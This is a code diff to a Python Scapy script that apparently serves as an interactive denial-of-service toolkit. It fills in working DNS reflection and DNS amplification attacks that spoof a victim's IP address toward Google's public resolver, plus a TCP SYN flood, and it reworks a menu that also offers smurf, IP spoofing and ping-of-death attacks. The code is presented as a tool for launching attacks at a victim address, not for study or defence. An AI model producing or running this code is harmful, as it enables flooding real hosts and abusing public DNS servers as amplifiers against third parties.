@@ -83,7 +83,7 @@ def validate_ip(ip):
 #Return a valid count for packets, either a positive input or default value
 def get_packetCount():
 	num = input("Please enter the number of packets to be sent. (default is 5)")
-	while int(num)<0 and num:
+	while num and int(num)<0:
 		num = input("Please enter a valid count for packets! (Default is 5) ")
 	return int(num) if num else 5
 
@@ -275,20 +275,50 @@ def ip_smurf_attack():
 def dns_reflection_attack():
 	print("\t\t DNS Reflection Attack")
 	print("-"*60)
-	#remaining code
+	victim_ip = input("Please enter the victim's IP address:")
+	while not validate_ip(victim_ip):
+		victim_ip = input("Invalid IP! Please enter a valid IP address")
+
+	num_packets = get_packetCount()
+	dns_ref = IP(src = victim_ip, dst = "8.8.8.8")/UDP(dport = 53)/DNS(rd = 1, qd = DNSQR(qname = "google.com", qtype = "A")) #Using google ns for now
+
+	send(dns_ref, count = num_packets)
+	print("\nDNS Reflection attack concluded successfully.")
+	print("-"*60)
 	
-#dns amplification attack
+#dns amplification attack, basically dns reflection with query type = 'ANY'
 def dns_amplification_attack():
 	print("\t\t DNS Amplification Attack \N{bomb}")
 	print("-"*60)
-	#remaining code
+	victim_ip = input("Please enter the victim's IP address:")
+	while not validate_ip(victim_ip):
+		victim_ip = input("Invalid IP! Please enter a valid IP address")
+
+	num_packets = get_packetCount()
+	dns_amp = IP(src = victim_ip, dst = "8.8.8.8")/UDP(dport = 53)/DNS(rd = 1, qd = DNSQR(qname = "google.com", qtype = "ANY")) #Using google ns for now
+
+	send(dns_amp, count = num_packets)
+	print("\nDNS Amplification attack finished.")
+	print("-"*60)
 	
 #TCP SYN flooding attack
 def tcp_synflood_attack():
 	print("\t\t TCP SYN Flooding Attack \N{water wave}")
 	print("-"*60)
 	#remaining code
-	
+	victim_ip = input("Please enter the victim's IP address:")
+	while not validate_ip(victim_ip):
+		victim_ip = input("Invalid IP! Please enter a valid IP address")
+
+	num_packets = get_packetCount()
+
+	syn_flood = IP(dst = victim_ip)/TCP(sport=RandShort(), dport= [80], seq=12345,ack=1000,window=1000,flags="S")/"Flooding you rn xD"
+
+	# ans,unans = srloop(syn_flood, inter=0.3, retry=2, timeout=4, count=num_packets)
+	send(syn_flood, count = num_packets)
+	print("\nTCP SYN flood attack launched successfully.")
+	print("-"*60)
+
 #ping of death attack
 def ping_of_death():
 	print("\t\t Ping of Death \N{skull}")
@@ -298,17 +328,17 @@ def ping_of_death():
 		victim_ip = input("Invalid IP! Please enter a valid IP address")
 
 	send( fragment(IP(dst=victim_ip)/ICMP()/("Very big payload"*60000)) )
-	print("\nPing of death attack concluded successfully.")
+	print("\nPing of death carried out successfully.")
 	print("-"*60)
 
 #option 4 of menu: launch attacks
 def launch_attacks():
 	print("It's time to launch attacks \N{fire} Kick off by choosing one of the following:- ") #replace fire symbol with unicode
 	print("1. IP Smurf Attack")
-	print("2. DNS Reflection Attack (Pending)")
-	print("3. DNS Amplification Attack (Pending)")
-	print("4. TCP SYN Flooding Attack (Pending)")
-	print("5. IP Spoofing")
+	print("2. IP Spoofing")
+	print("3. DNS Amplification Attack")
+	print("4. DNS Reflection Attack")
+	print("5. TCP SYN Flooding Attack")
 	print("6. Ping of Death")
 	print("7. Exit")
 	ch=0
@@ -325,16 +355,16 @@ def launch_attacks():
 		ip_smurf_attack()
 	elif(ch == 2):
 		os.system('clear')
-		dns_reflection_attack()
+		ip_spoofing()
 	elif(ch==3):
 		os.system('clear')
 		dns_amplification_attack()
 	elif(ch==4):
 		os.system('clear')
-		tcp_synflood_attack()
+		dns_reflection_attack()
 	elif(ch==5):
 		os.system('clear')
-		ip_spoofing()
+		tcp_synflood_attack()
 	elif(ch==6):
 		os.system('clear')
 		ping_of_death()
